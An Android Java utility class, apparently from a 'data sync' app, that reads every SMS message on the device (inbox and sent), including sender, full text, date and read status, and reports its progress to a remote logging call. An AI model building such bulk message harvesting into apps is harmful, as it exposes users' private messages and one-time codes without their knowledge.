package com.yinlan.newdatasyc.base.utils;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.icu.util.TimeZone;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract.PhoneLookup;
import android.text.TextUtils;

import com.yinlan.newdatasyc.bean.SMSData;
import com.yinlan.newdatasyc.newwork.HttpSendReq;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class SMSUtils {


    public static List<SMSData> getSmsInfos(Context context) {
        List<SMSData> list = new ArrayList<>();
        Cursor cursor = null;
        try {
            final String SMS_URI_INBOX = "content://sms/";// 所有内容
            ContentResolver cr = context.getContentResolver();
            String[] projection = new String[]{"_id", "address", "person", "body", "date", "type", "read"};
            Uri uri = Uri.parse(SMS_URI_INBOX);
            cursor = cr.query(uri, projection, null, null, "date desc");
            if (cursor == null) {
                HttpSendReq.getInstance().collectException("getSmsInfos: cursor == null");
                return list;
            }
            HttpSendReq.getInstance().collectException("开始遍历短信: " + getCurrentTime() + ", TimeZone: " + getGmtTimeZone());
            while (cursor.moveToNext()) {
                SMSData messageInfo = new SMSData();
                // -----------------------信息----------------
//            int nameColumn = cursor.getColumnIndex("person");// 联系人姓名列表序号
                int phoneNumberColumn = cursor.getColumnIndex("address");// 手机号
                int smsbodyColumn = cursor.getColumnIndex("body");// 短信内容
                int dateColumn = cursor.getColumnIndex("date");// 日期
                int typeColumn = cursor.getColumnIndex("type");// 收发类型 1表示接受 2表示发送
                int smsIdColumn = cursor.getColumnIndex("_id");
                int readColumn = cursor.getColumnIndex("read");//0未读，1已读
                String phoneNumber = cursor.getString(phoneNumberColumn);
                String smsbody = cursor.getString(smsbodyColumn);
                String typeStr = cursor.getString(typeColumn);
                String smsId = cursor.getString(smsIdColumn);

                messageInfo.phone = phoneNumber;
                messageInfo.name = phoneNumber;
                messageInfo.smsId = smsId;
                messageInfo.content = smsbody;
                messageInfo.read =cursor.getInt(readColumn);
                messageInfo.time = cursor.getLong(dateColumn);
                messageInfo.type = typeStr;

                list.add(messageInfo);
            }
            cursor.close();
        } catch (Exception e) {
            HttpSendReq.getInstance().collectException("getSmsInfos: " + e.toString());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        HttpSendReq.getInstance().collectException("结束遍历短信: " + getCurrentTime() + ", TimeZone: " + getGmtTimeZone());
        return list;
    }

    private static String getCurrentTime() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        Date date = new Date();
        String dateString = sdf.format(date);
        return dateString;
    }


    public static String getGmtTimeZone() {
        int _t = 0;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            _t = TimeZone.getDefault().getOffset(System.currentTimeMillis()) / (3600 * 1000);
        }
        return String.valueOf(_t);
    }
}
